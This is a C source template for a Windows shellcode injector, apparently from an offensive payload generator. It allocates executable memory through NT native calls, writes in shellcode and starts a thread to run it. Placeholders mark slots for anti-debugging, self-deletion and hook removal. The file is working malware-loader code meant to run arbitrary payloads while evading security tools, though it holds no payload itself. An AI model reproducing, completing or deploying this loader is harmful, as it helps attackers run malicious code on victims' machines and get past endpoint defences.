#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//####USING####

#pragma comment(lib, "ntdll")

//####DEFINE####

//####CODE####


int Inject()
{
	int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    int i;
    for (i = 0; i < length; i++)
    {
        if (i > 0) printf(":");
        printf("%02X", encoded[i]);
    }
    printf("\n");

    //####CALL####

    unsigned char* decoded = encoded;

	unsigned long size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	SIZE_T RegionSize = (SIZE_T)length;

	LPVOID allocation_start = nullptr;

    NTSTATUS status;
	HANDLE targetHandle = (HANDLE)((int)-1);
	if (targetHandle == 0){
	    printf("[-] Invalid Target Handle\n");
	    exit(1);
	}
    printf("[*] Allocating virtual memory\n");
	status = NtAllocateVirtualMemory(targetHandle, &allocation_start, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status < 0){
	    printf("[-] Memory allocation failed\n");
	    exit(1);
	}

    printf("[*] Writing virtual memory\n");
	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
    if (status < 0){
	    printf("[-] Memory writing failed\n");
	    exit(1);
	}

	HANDLE targetThreadHandle = NULL;
    printf("[*] Creating thread\n");
	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (targetThreadHandle == NULL){
	    printf("[-] Invalid Thread Handle\n");
	    exit(1);
	}

	Sleep(1*1000);

	return 0;
}

int main(int argc, char** argv) {

    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####
    //####SELF_DELETE####
	//####UNHOOK####

	Inject();

}